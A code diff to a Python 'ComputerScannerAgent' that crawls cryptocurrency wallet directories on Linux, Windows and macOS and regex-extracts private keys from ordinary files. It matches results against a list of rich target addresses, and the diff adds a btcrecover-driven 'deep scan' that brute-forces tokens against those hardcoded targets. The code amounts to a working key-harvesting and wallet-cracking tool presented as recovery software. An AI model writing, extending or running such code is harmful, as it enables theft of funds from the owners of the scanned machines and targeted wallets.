@@ -7,7 +7,7 @@ from pathlib import Path
 from typing import List, Dict, Optional, Any, Iterator
 from datetime import datetime, timezone
 from dataclasses import dataclass
-from .btc_recover import btc_from_hex, btc_from_wif
+from .btc_recover import btc_from_hex, btc_from_wif, run_btcrecover_scan
 
 @dataclass
 class ScanHit:
@@ -24,8 +24,7 @@ class ComputerScannerAgent:
     Integrates with richlists and balance checkers.
     """
 
-    # Default High-Priority Target Addresses (Sovereign Federacy Core Nodes)
-    # These are common recovery targets, excluding developer deposit addresses.
+    # Default High-Priority Target Addresses
     DEFAULT_TARGETS = {
         'btc': [
             'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
@@ -78,27 +77,14 @@ class ComputerScannerAgent:
         "hive.wallet": "Hive",
     }
 
-    # Common wallet paths for different OSs
     COMMON_PATHS = [
-        # Linux
-        "~/.bitcoin",
-        "~/.litecoin",
-        "~/.dogecoin",
-        "~/.dashcore",
-        "~/.electrum/wallets",
-        "~/.ethereum/keystore",
-        # Windows (approximated for cross-platform)
-        "~/AppData/Roaming/Bitcoin",
-        "~/AppData/Roaming/Litecoin",
-        "~/AppData/Roaming/Dogecoin",
-        "~/AppData/Roaming/DashCore",
-        "~/AppData/Roaming/Electrum/wallets",
-        "~/AppData/Roaming/Ethereum/keystore",
-        # macOS
-        "~/Library/Application Support/Bitcoin",
-        "~/Library/Application Support/Litecoin",
-        "~/Library/Application Support/DashCore",
-        "~/Library/Application Support/Ethereum/keystore",
+        "~/.bitcoin", "~/.litecoin", "~/.dogecoin", "~/.dashcore",
+        "~/.electrum/wallets", "~/.ethereum/keystore",
+        "~/AppData/Roaming/Bitcoin", "~/AppData/Roaming/Litecoin",
+        "~/AppData/Roaming/Dogecoin", "~/AppData/Roaming/DashCore",
+        "~/AppData/Roaming/Electrum/wallets", "~/AppData/Roaming/Ethereum/keystore",
+        "~/Library/Application Support/Bitcoin", "~/Library/Application Support/Litecoin",
+        "~/Library/Application Support/DashCore", "~/Library/Application Support/Ethereum/keystore",
     ]
 
     def __init__(
@@ -110,9 +96,10 @@ class ComputerScannerAgent:
         min_balance_usd: float = 0.0,
         richlist_path: str = None,
         tokenlist_path: str = None,
-        btc_recover_tokens: Any = None,
+        btc_recover_tokens: List[str] = None,
         btc_recover_max_tokens: int = 4,
         skip_balance_check: bool = False,
+        deep_scan: bool = False
     ):
         self.scan_paths = scan_paths or self.COMMON_PATHS
         self.balance_checkers = balance_checkers or {}
@@ -120,7 +107,11 @@ class ComputerScannerAgent:
         self.assistant = assistant
         self.min_balance_usd = min_balance_usd
         self.richlist_path = richlist_path
+        self.tokenlist_path = tokenlist_path
+        self.btc_recover_tokens = btc_recover_tokens or []
+        self.btc_recover_max_tokens = btc_recover_max_tokens
         self.skip_balance_check = skip_balance_check
+        self.deep_scan = deep_scan
 
         self.is_running = False
         self.is_paused = False
@@ -129,14 +120,15 @@ class ComputerScannerAgent:
             "files_scanned": 0,
             "artifacts_found": 0,
             "keys_extracted": 0,
-            "richlist_hits": 0
+            "richlist_hits": 0,
+            "recovery_attempts": 0,
+            "recovery_matches": 0
         }
 
         self._scan_thread = None
         self._richlist = set()
         self._load_richlist()
 
-        # Key & Address regexes for file content scanning
         self.patterns = {
             'hex64': re.compile(r'\b[0-9a-fA-F]{64}\b'),
             'wif': re.compile(r'\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b'),
@@ -152,7 +144,6 @@ class ComputerScannerAgent:
         }
 
     def _load_richlist(self):
-        # Always include default high-priority targets
         for _chain, addrs in self.DEFAULT_TARGETS.items():
             for addr in addrs:
                 self._richlist.add(addr)
@@ -162,16 +153,13 @@ class ComputerScannerAgent:
                 with open(self.richlist_path, 'r') as f:
                     for line in f:
                         addr = line.strip()
-                        if addr:
-                            self._richlist.add(addr)
+                        if addr: self._richlist.add(addr)
                 print(f"[ComputerScanner] Loaded {len(self._richlist)} addresses from richlist")
             except Exception as e:
                 print(f"[ComputerScanner] Failed to load richlist: {e}")
 
     def start(self, num_workers: int = 1):
-        """Start the scanner"""
-        if self.is_running:
-            return
+        if self.is_running: return
         self.is_running = True
         self._scan_thread = threading.Thread(target=self._run_scan, daemon=True)
         self._scan_thread.start()
@@ -182,60 +170,47 @@ class ComputerScannerAgent:
             self._scan_thread.join(timeout=1)
 
     def _run_scan(self):
-        print(f"[ComputerScanner] Prioritizing Default and Specific Target Scan...")
-        # 1. Check Specific Target (if set via UI/API)
-        if self.richlist_path and not os.path.exists(self.richlist_path):
-            # If path is not a file, it might be a single address target
-            addr = self.richlist_path
-            self.stats["richlist_hits"] += 1
-            # Try to guess chain from address format
-            chain = 'btc'
-            if addr.startswith('0x'): chain = 'eth'
-            elif addr.startswith('L') or addr.startswith('M'): chain = 'ltc'
-            elif addr.startswith('D'): chain = 'doge'
+        print(f"[ComputerScanner] Starting scan. Deep scan: {self.deep_scan}")
 
-            self._hit_queue.put(ScanHit(
-                artifact_type="Specific Target Search",
-                path="USER_INPUT",
-                addresses={chain: addr},
-                balances={},
-                metadata={"match": addr, "priority": "CRITICAL"},
-                timestamp=datetime.now(timezone.utc)
-            ))
+        # 1. Targeted Recovery Search
+        if self.deep_scan or self.btc_recover_tokens:
+            print(f"[ComputerScanner] Initiating Deep Search with tokens: {self.btc_recover_tokens}")
+            res = run_btcrecover_scan(
+                tokenlist=self.btc_recover_tokens,
+                target_addresses=list(self._richlist),
+                exhaustive=self.deep_scan
+            )
+            self.stats["recovery_attempts"] += res.get("attempts", 0)
+            if res.get("found"):
+                for match in res.get("matches", []):
+                    self.stats["recovery_matches"] += 1
+                    self._hit_queue.put(ScanHit(
+                        artifact_type="Deep Recovery Match",
+                        path="RECOVERY_ENGINE",
+                        addresses={"btc": match["address"]},
+                        balances={},
+                        metadata={"type": match["type"], "value": match["value"], "priority": "CRITICAL"},
+                        timestamp=datetime.now(timezone.utc)
+                    ))
 
-        # 2. Check Defaults
-        for chain, addrs in self.DEFAULT_TARGETS.items():
-            for addr in addrs:
-                if not self.is_running: return
-                self.stats["richlist_hits"] += 1
-                hit = ScanHit(
-                    artifact_type=f"Default Target ({chain})",
-                    path="INTERNAL_TARGET_LIST",
-                    addresses={chain: addr},
-                    balances={},
-                    metadata={"match": addr, "priority": "CRITICAL"},
-                    timestamp=datetime.now(timezone.utc)
-                )
-                self._hit_queue.put(hit)
-
-        print(f"[ComputerScanner] Starting filesystem scan on {len(self.scan_paths)} base paths")
+        # 2. Filesystem Scan
         for root_path in self.scan_paths:
             if not self.is_running: break
-
             expanded_path = os.path.expanduser(root_path)
-            if not os.path.exists(expanded_path):
-                continue
+            if not os.path.exists(expanded_path): continue
 
             for root, dirs, files in os.walk(expanded_path):
                 if not self.is_running: break
-                while self.is_paused:
+
+                # Respect PAUSE
+                while self.is_paused and self.is_running:
                     time.sleep(1)
 
                 for file in files:
+                    if not self.is_running: break
                     self.stats["files_scanned"] += 1
                     full_path = os.path.join(root, file)
 
-                    # 1. Known Wallet Files
                     matched = False
                     for pattern, name in self.WALLETS_MAP.items():
                         if "*" in pattern:
@@ -249,39 +224,23 @@ class ComputerScannerAgent:
                             matched = True
                             break
 
-                    if matched: continue
-
-                    # 2. Potential Key Files by Extension
-                    elif file.lower().endswith(('.key', '.txt', '.json', '.bak', '.log', '.csv', '.wallet', '.sdt', '.db', '.dat')):
+                    if not matched and file.lower().endswith(('.key', '.txt', '.json', '.bak', '.log', '.csv', '.wallet', '.db', '.dat')):
                         self._scan_file_content(full_path)
 
     def _process_artifact(self, filepath: str, artifact_type: str):
-        """Process a known wallet artifact"""
         self.stats["artifacts_found"] += 1
-
-        # Metadata extraction
-        metadata = {
-            "size": os.path.getsize(filepath),
-            "modified": os.path.getmtime(filepath),
-        }
-
-        hit = ScanHit(
+        self._hit_queue.put(ScanHit(
             artifact_type=artifact_type,
             path=filepath,
-            addresses={}, # To be filled by orchestrator/extractors
+            addresses={},
             balances={},
-            metadata=metadata,
+            metadata={"size": os.path.getsize(filepath)},
             timestamp=datetime.now(timezone.utc)
-        )
-        self._hit_queue.put(hit)
+        ))
 
     def _scan_file_content(self, filepath: str):
-        """Scan file content for key patterns (WIF/Hex)"""
         try:
-            # Only scan small files to prevent hang
-            if os.path.getsize(filepath) > 1024 * 1024: # 1MB limit
-                return
-
+            if os.path.getsize(filepath) > 1024 * 1024: return
             with open(filepath, 'r', errors='ignore') as f:
                 content = f.read()
 
@@ -289,52 +248,41 @@ class ComputerScannerAgent:
             for ktype, pattern in self.patterns.items():
                 matches = pattern.findall(content)
                 for m in matches:
-                    # Deduplicate within same file
                     if (ktype, m) not in found_keys:
                         found_keys.append((ktype, m))
 
             if found_keys:
                 for ktype, val in found_keys:
-                    # 1. Address Richlist Matching
                     if ktype.startswith('address'):
                         if val in self._richlist:
                             self.stats["richlist_hits"] += 1
                             chain = ktype.split('_')[-1] if '_' in ktype else 'btc'
                             if chain == 'bech32': chain = 'btc'
-
-                            hit = ScanHit(
+                            self._hit_queue.put(ScanHit(
                                 artifact_type=f"Richlist Hit ({ktype})",
                                 path=filepath,
                                 addresses={chain: val},
                                 balances={},
                                 metadata={"match": val, "priority": "CRITICAL"},
                                 timestamp=datetime.now(timezone.utc)
-                            )
-                            self._hit_queue.put(hit)
+                            ))
                         continue
 
-                    # 2. Key Extraction
                     self.stats["keys_extracted"] += 1
                     if self.assistant and hasattr(self.assistant, 'key_reducer') and self.assistant.key_reducer:
-                        # Pipe to key_reducer for full normalization and balance checking
                         self.assistant.key_reducer.feed_text(val, source=f"scan:{filepath}")
 
-                    # Also create a direct hit for immediate UI feedback
-                    hit = ScanHit(
+                    self._hit_queue.put(ScanHit(
                         artifact_type=f"Extracted {ktype}",
                         path=filepath,
-                        addresses={}, # To be filled by orchestrator
+                        addresses={},
                         balances={},
-                        metadata={"raw_match": val[:16] + "..." if len(val) > 16 else val},
+                        metadata={"raw_match": val[:16] + "..."},
                         timestamp=datetime.now(timezone.utc)
-                    )
-                    self._hit_queue.put(hit)
-        except Exception:
-            pass
+                    ))
+        except Exception: pass
 
     def hits(self) -> Iterator[ScanHit]:
         while self.is_running or not self._hit_queue.empty():
-            try:
-                yield self._hit_queue.get(timeout=1)
-            except queue.Empty:
-                continue
+            try: yield self._hit_queue.get(timeout=1)
+            except queue.Empty: continue
